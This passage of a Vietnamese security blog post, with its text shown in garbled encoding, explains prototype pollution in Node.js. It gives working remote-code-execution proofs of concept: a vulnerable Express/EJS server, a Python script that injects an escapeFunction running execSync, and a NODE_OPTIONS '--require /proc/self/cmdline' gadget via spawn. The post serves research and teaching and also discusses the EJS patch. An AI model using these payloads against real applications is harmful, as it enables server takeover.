<li>S·∫Ω ra sao n·∫øu ta kh√¥ng c√≥ prototype pollution nh∆∞ng c√≥ th·ªÉ handle ƒë∆∞·ª£c bi·∫øn data ?
Khi express g·ªçi t·ªõi render b·∫£n ch·∫•t n√≥ s·∫Ω g·ªçi t·ªõi <strong>export.__express</strong></li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">   // default engine export
    var fn = require(mod).__express
</code></pre>
<p>Ejs :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">/**
 * Express.js support.
 *
 * This is an alias for {@link module:ejs.renderFile}, in order to support
 * Express.js out-of-the-box.
 *
 * @func
 */

exports.__express = exports.renderFile;

</code></pre>
<p>V·∫≠y b·∫£n ch·∫•t c·ªßa express s·∫Ω g·ªçi t·ªõi h√†m renderFile :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = { filename: filename };
  var data;
  var viewOpts;

  // Do we have a callback?
  if (typeof arguments[arguments.length - 1] == 'function') {
    cb = args.pop();
  }
  // Do we have data/opts?
  if (args.length) {
    // Should always have data obj
    data = args.shift();
    // Normal passed opts (data obj + opts obj)
    if (args.length) {
      // Use shallowCopy so we don't pollute passed in opts obj with new vals
      utils.shallowCopy(opts, args.pop());
    }
    // Special casing for Express (settings + opts-in-data)
    else {
      // Express 3 and 4
      if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        // Undocumented after Express 2, but still usable, esp. for
        // items that are unsafe to be passed along with data, like `root`
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
      // Express 2 and lower, values set in app.locals, or people who just
      // want to pass options in their data. NOTE: These values will override
      // anything previously set in settings  or settings['view options']
      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    }
    opts.filename = filename;
  }
  else {
    data = utils.createNullProtoObjWherePossible();
  }

  return tryHandleCache(opts, data, cb);
};
</code></pre>
<p>H√†m n√†y kh√° t∆∞∆°ng ƒë·ªìng v·ªõi h√†m render b√¨nh th∆∞·ªùng nh∆∞ng s·∫Ω c√≥ v√†i ƒëi·ªÉm ƒë·∫∑c bi·ªát ƒë√≥ l√† :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
</code></pre>
<ul>
<li>Ta c√≥ th·ªÉ th·∫•y ·ªü ƒë√¢y , data c√≥ th·ªÉ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp t·ªõi bi·∫øn <strong>opts</strong>  v√† t·ª´ ƒë√≥ ch·∫≥ng kh√°c g√¨ ta c√≥ th·ªÉ ki·ªÉm so√°t bi·ªÉn opts v√† l·∫•y rce .</li>
</ul>

<h3 id="poc--1" class="header-anchor-wrapper">POC :
  <a href="#poc--1" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h3>

<p>server.js :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express');
const path = require('path');

const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());


// Set EJS as the template engine
app.set('view engine', 'ejs');

// Set the views directory
app.set('views', path.join(__dirname, 'views'));

app.post(&quot;/pollute_me&quot;, (req, res) =&gt; {
    // Prototype pollution vulnerability here
    const data = { title: 'Hello EJS', message: 'Welcome to EJS Template!' }
    Object.assign(data, req.body);
    res.render('index', data)
})
// Define a simple route
app.get('/', (req, res) =&gt; {
    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () =&gt; {
    console.log(`Server running on http://localhost:${PORT}`);
});

</code></pre>
<p>ex.py :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">import  requests
url = &quot;http://localhost:3000&quot;
escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
data  = { 
    &quot;settings&quot; : {
        &quot;view options&quot; : {
         &quot;client&quot; : '123' ,
        &quot;escapeFunction&quot; : escapeFunction       
        }
    }
}
res = requests.post(url+'/pollute_me' ,json=data)
print(res.text)
requests.get(url)

</code></pre>
<ul>
<li><strong>L∆∞u √Ω</strong>:  gadget tr√™n ch·ªâ ho·∫°t ƒë·ªông khi ki·ªÉm so√°t ƒë∆∞·ª£c property tr·ª±c ti·∫øp c·ªßa data ch·ª© kh√¥ng ph·∫£i proottype pollution v√¨ khi parse <strong>renderOptions</strong> , n√≥ ch·ªâ copy c√°c own property thui ch·ª© kh√¥ng d√πng lu√¥n c·∫£ objects ƒë·∫•y.</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">var renderOptions = { ...this.locals, ...opts._locals, ...opts };
</code></pre>

<h1 id="how-it-get-patched" class="header-anchor-wrapper">How it get patched
  <a href="#how-it-get-patched" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>V√¨ root cause ·ªü ƒë√¢y l√† do h√†m generate Template function nh·∫≠n opts m√† kh√¥ng ki·ªÉm tra kƒ© n√™n patch ƒë∆°n gi·∫£n nh∆∞u sau  :
<a href="https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10">https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10</a>
<img alt="image" src="https://hackmd.io/_uploads/BJ7m3GkOee.png"></li>
</ul>
<p>N√≥ s·∫Ω ki·ªÉm tra c√°c bi·∫øn c√≥ ph·∫£i l√† property tr·ª±c ti·∫øp hay kh√¥ng sau ƒë√≥ tr·∫£ copy v√†o m·ªôt Null Object v√† returns v·ªÅ . Kh√¥ng bi·∫øt c√≥ bypass ƒëc ko :v
Nh√¨n chung n·∫øu ta c√≥ th·ªÉ ki·ªÉm so√°t bi·∫øn data (not prototype pollution) th√¨ rce v·∫´n posssible .</p>

<h1 id="m·ªôt-v√†i-ƒëi·ªÉm-th√∫-v·ªã-v·ªÅ-for-in-" class="header-anchor-wrapper">M·ªôt v√†i ƒëi·ªÉm th√∫ v·ªã v·ªÅ for in :
  <a href="#m%e1%bb%99t-v%c3%a0i-%c4%91i%e1%bb%83m-th%c3%ba-v%e1%bb%8b-v%e1%bb%81-for-in-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p>X√©t v√≠ d·ª• sau :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
    &quot;main&quot;: &quot;/main.js&quot;,
}

Object.prototype.polluted = &quot;WTF&quot;
console.log(&quot;Just log it out : &quot;, scripts)

for (let script in scripts) {
    console.log(&quot;[&quot; + script + &quot;] =&gt; &quot; + scripts[script])
}
</code></pre>
<p>K·∫øt qu·∫£ s·∫Ω c√≥ ch·ª©a polluted kh√¥ng ? C√¢u tr·∫£ l·ªùi l√† c√≥   :
<img alt="image" src="https://hackmd.io/_uploads/H1jr8KJ_gl.png">
ƒê·ªçc t√≠ document v·ªÅ t√≠nh ch·∫•t c·ªßa for in ta c√≥ th·ªÉ th·∫•y r·∫±ng <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties</a>
<img alt="image" src="https://hackmd.io/_uploads/ry2vUFJuxl.png">
N√≥ s·∫Ω ch·∫•p nh·∫≠n lu√¥n c·∫£ nh·ªØng enumerable l√† inherited t·ª´ Object prototype ! B√†i n√†y m√¨nh th·∫•y ·ªü malta ctf kh√° hay  (m·∫∑c d√π m√¨nh k gi·∫£i ra:( )</p>

<h1 id="universal-gadget" class="header-anchor-wrapper">Universal Gadget
  <a href="#universal-gadget" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p><a href="https://portswigger.net/web-security/prototype-pollution/server-side">https://portswigger.net/web-security/prototype-pollution/server-side</a></p>
<ul>
<li>Ngo√†i ra c√≥ m·ªôt gadget kh√° nguy hi·ªÉm ƒë·ªëi v·ªõi c√°c phi√™n b·∫£n Node js c≈© khi spawn m·ªôt process m·ªõi .</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">function spawn(file, args, options) {
    const child = new ChildProcess();

    options = normalizeSpawnArguments(file, args, options);
    debug('spawn', options);
    child.spawn(options);

    return child;
}

</code></pre>
<p>H√†m tr√™n s·∫Ω t·∫°o m·ªôt process v√† truy·ªÅn options ƒë∆∞·ª£c l·∫•y t·ª´ <strong>normalizeSpawnArguments</strong>
V·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† h√†m tr√™n c√≥ m·ªôt bug v·ªÅ pp .</p>
<pre  class="mc-prism hide language-text" ><code class="language-j">    const env = options.env || process.env;
    const envPairs = [];
    // Prototype values are intentionally included.
    for (const key in env) {
        const value = env[key];
        if (value !== undefined) {
            envPairs.push(`${key}=${value}`);
        }
    }
 return {
        // Make a shallow copy so we don't clobber the user's options object.
        ...options,
        args,
        detached: !!options.detached,
        envPairs,
        file,
        windowsHide: !!options.windowsHide,
        windowsVerbatimArguments: !!windowsVerbatimArguments
    };
</code></pre>
<ul>
<li>Nh∆∞ ta ƒë√£ bi·∫øt v√≤ng for in ·ªü ƒë√¢y s·∫Ω loop qua c·∫£ c√°c prototype v√† d∆∞·ªùng nh∆∞ ƒëi·ªÅu n√†y ƒë√£ ƒë∆∞·ª£c c√°c developer intend nh∆∞ng m√† kh√¥ng hi·ªÉu sao l·∫°i intend v n·ªØa : )</li>
<li>V·∫≠y spawn m·ªôt process m·ªõi v√† ki·ªÉm so√°t ƒë∆∞·ª£c options th√¨ ta c√≥ th·ªÉ l√†m ƒë∆∞·ª£c g√¨ ? C√≥ m·ªôt options kh√° th√∫ v·ªã n·∫øu nh∆∞ ta spawn m·ªôt <strong>node</strong> process .
ƒê√≥ l√† NODE_OPTIONS : <a href="https://nodejs.org/api/cli.html#node_optionsoptions">https://nodejs.org/api/cli.html#node_optionsoptions</a>
<img alt="image" src="https://hackmd.io/_uploads/SyeQrpZOll.png">
V√† ta c√≥ th·ªÉ th·∫•y  :
<img alt="image" src="https://hackmd.io/_uploads/HymIrpWugx.png">
K·∫øt h·ª£p ƒëi·ªÅu n√†y v·ªõi gadget tr√™n th√¨ ta c√≥ th·ªÉ d·ªÖ d√†ng l·∫•y RCE . V·∫≠y l√†m sao c√≥ th·ªÉ l√†m ƒë∆∞·ª£c khi ta kh√¥ng c√≥ th·ªÉ t·∫°o file ? Ta c√≥ th·ªÉ l·ª£i d·ª•ng c√°c file ƒë·∫∑c bi·ªát nh∆∞ /proc/self/environ nh∆∞ v√≠ d·ª• ·ªü Kibana nh∆∞ng ƒëi·ªÅu n√†y ƒë√£ b·ªã ch·∫∑n v√† kh√¥ng c√≤n kh·∫£ thi  v√¨ node js ƒë√£ fixx l·ªói n√†y v√† lu√¥n ƒë·∫∑t environ ·ªü cu·ªëi c√πng.</li>
<li>V·∫≠y l√† sao ƒë·ªÉ bypass  ?
Ta s·∫Ω l·ª£i d·ª•ng m·ªôt file ƒë·∫∑c bi·ªát l√† file <strong>/proc/self/cmdline</strong> l√† file s·∫Ω tr·∫£ v·ªÅ argv[0] v√≠ d·ª•  :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);

const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
    env: {
        ...process.env, // inherit parent env
    },
    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
});

</code></pre>
<p>rce.js :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const fs = require(&quot;fs&quot;);

const cmdline = fs.readFileSync(&quot;/proc/self/cmdline&quot;);
console.log(cmdline.toString().split(&quot;\0&quot;));

</code></pre>
<p>Khi n√†y ta s·∫Ω th·∫•y argv[0] t∆∞∆°ng ƒë∆∞∆°ng v·ªõi &rsquo;node&rsquo;  :<br>
<img alt="image" src="https://hackmd.io/_uploads/H1byy0b_ee.png"></p>
<ul>
<li>V√† ƒëi·ªÅu ƒë·∫∑c bi·ªát l√† spawn function c√≥ h·ªó tr·ª£ ch·ª©c nƒÉng set argv[0] m√† kh√¥ng l√†m thay ƒë·ªïi executable file .
<img alt="image" src="https://hackmd.io/_uploads/By5WyR-Oxx.png"></li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);

const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
    argv0: &quot;abc&quot;,
    env: {
        ...process.env, // inherit parent env
    },
    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
});
</code></pre>
<p><img alt="image" src="https://hackmd.io/_uploads/HJzVkCZdgg.png">
K·∫øt h·ª£p ƒëi·ªÅu n√†y v·ªõi NODE_OPTIONS v√† /proc/self/cmdline ta c√≥ payload nh∆∞ sau  :+1:</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);

const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
    argv0: &quot;console.log(123);//&quot;,
    env: {
        ...process.env, // inherit parent env
        NODE_OPTIONS: &quot;--require /proc/self/cmdline&quot;
    },
    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
});
</code></pre>
<p><img alt="image" src="https://hackmd.io/_uploads/S1hLy0bOxg.png"></p>
<ul>
<li>Cu·ªëi c√πng k·∫øt h·ª£p v·ªõi prototype pollution th√¨ ta s·∫Ω d·ªÖ d√†ng c√≥ ƒë∆∞·ª£c rce .</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);

Object.prototype.env = {}; // dummy object
Object.prototype.env.NODE_OPTIONS = &quot;--require /proc/self/cmdline&quot;; // trigger loadJ
Object.prototype.argv0 = `require(&quot;child_process&quot;).execSync(&quot;id &gt; pwn&quot;);//`;

spawn(&quot;node&quot;);
</code></pre>
<p><img alt="image" src="https://hackmd.io/_uploads/SkbvVAZugg.png"></p>

<h1 id="so-s√°nh-__proto__-v√†-constructorprototype" class="header-anchor-wrapper">So s√°nh _<em>proto</em>_ v√† constructor.prototype?
  <a href="#so-s%c3%a1nh-__proto__-v%c3%a0-constructorprototype" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p>Nh∆∞ m·ªçi ng∆∞·ªùi ai c≈©ng bi·∫øt l√† khi l√†m prototype pollution ta th∆∞·ªùng d√πng c√°c key nh∆∞ &ldquo;<strong>proto</strong>&rdquo; hay &ldquo;constructor.prototype&rdquo; ƒë·ªÉ access ƒë∆∞·ª£c Object.prototype nh∆∞ng v√¨ sao l·∫°i nh∆∞ v·∫≠y ?</p>

<h2 id="constructorprototype-" class="header-anchor-wrapper">Constructor.prototype :
  <a href="#constructorprototype-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>Ta c√≥ th·ªÉ hi·ªÉu ƒë∆°n gi·∫£n l√† l·∫•y prototype c·ªßa constructor ƒë√≥ .
Nh√¨n v√†o ƒëo·∫°n code sau :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">    const a = {} ;
// T∆∞∆°ng ƒë∆∞∆°ng v·ªõi
    const a = Object.create(Object.prototype)
    
</code></pre>
<p><img alt="image" src="https://hackmd.io/_uploads/rJeswK1ugl.png"></p>
<ul>
<li>H√†m Object.create s·∫Ω t·∫°o m·ªôt object v√† s·ª≠ d·ª•ng m·ªôt Object ƒëang t·ªìn t·∫°i l√†m prototype cho ch√∫ng v√† l∆∞u v√†o __proto__ .</li>
<li>C√≤n constructor l√† tr·ªè v·ªÅ object v√† l·∫•y prootytpe c·ªßa Object . N√™n v√¥ t√¨nh s·∫Ω khi·∫øn cho __proto__ == Object.prototype</li>
</ul>

<h2 id="__proto__" class="header-anchor-wrapper">__proto__
  <a href="#__proto__" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>S·∫Ω c√≥ c√°c tr∆∞·ªùng h·ª£p __proto__ s·∫Ω kh√°c v·ªõi constructor.prototype nh∆∞ :
<img alt="image" src="https://hackmd.io/_uploads/rykrdYyOlx.png"></li>
<li>V√≠ d·ª• tr√™n trang ch√≠nh v·∫≠y. Khi n√†y __proto__ == person.
<img alt="image" src="https://hackmd.io/_uploads/B1guOY1Oxg.png"></li>
<li>C√≤n constructor c·ªßa n√≥ v·∫´n l√† Object n√™n ƒë∆°n gi·∫£n tr·∫£ v·ªÅ Object prototype
<img alt="image" src="https://hackmd.io/_uploads/BJH5Ot1Oxl.png"></li>
</ul>

<h1 id="c√°c-method-ƒë·ªÉ-l·∫•y-prototype" class="header-anchor-wrapper">C√°c method ƒë·ªÉ l·∫•y Prototype
  <a href="#c%c3%a1c-method-%c4%91%e1%bb%83-l%e1%ba%a5y-prototype" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>C√°i n√¨ m√¨nh t√≥m t·∫Øt trick l·ªè l·∫•y ƒë∆∞·ª£c t·ª´ X th√¥i :v
<a href="https://x.com/arkark_/status/1943260773268230205?s=46">https://x.com/arkark_/status/1943260773268230205?s=46</a>
<img alt="8219bfac-78cd-4b0e-9186-92f075010cd6" src="https://hackmd.io/_uploads/HyXNttk_lg.jpg"></li>
</ul>

<h1 id="challenges-" class="header-anchor-wrapper">Challenges :
  <a href="#challenges-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>M√¨nh c√≥ l√†m m·ªôt challenge nh·ªè , m·ªçi ng∆∞·ªùi c√≥ th·ªÉ ch∆°i th·ª≠ v√† n·∫øu c√≥ th·∫Øc m·∫Øc th√¨ c√≥ th·ªÉ DM m√¨nh nh√© :
<a href="https://drive.google.com/file/d/1Me7WBTw2pHqhwHM2lQncnwmwlcfF3IEw/view?usp=sharing">https://drive.google.com/file/d/1Me7WBTw2pHqhwHM2lQncnwmwlcfF3IEw/view?usp=sharing</a></li>
<li>L·∫ßn ƒë·∫ßu m√¨nh l√†m chall n√™n ch·∫Øc s·∫Ω c√≥ nhi·ªÅu bug unintend ƒë·∫•y :v</li>
</ul>

<h1 id="resource-" class="header-anchor-wrapper">Resource :
  <a href="#resource-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p><a href="https://nodejs.org/api/cli.html#cli_node_options_options">https://nodejs.org/api/cli.html#cli_node_options_options</a>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof</a>
<a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">https://www.sonarsource.com/blog/blitzjs-prototype-pollution/</a>
<a href="https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf">https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf</a>
<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2025 by 3HLD Team | v1.0</article>
</footer>

</body>
</html>
